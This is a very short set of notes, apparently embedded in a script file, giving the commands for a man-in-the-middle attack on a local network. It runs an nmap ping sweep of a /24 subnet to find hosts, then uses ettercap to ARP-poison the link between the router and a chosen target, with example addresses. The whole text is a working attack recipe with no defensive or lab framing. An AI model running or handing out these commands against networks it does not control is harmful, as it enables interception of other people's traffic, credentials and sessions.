'''
Man in the middle attack

Need ettercap installed and nmap
'''


'''
scan nmap
sudo nmap -sn [router ip number]/24
ex: sudo nmap -sn 10.133.0.254/24

choose ip addr and mim attack
sudo ettercap -T -S -i en0 -M arp:remote /[router ip number]// /[target]//
ex: sudo ettercap -T -S -i en0 -M arp:remote /10.133.0.254// /10.133.0.14//

'''
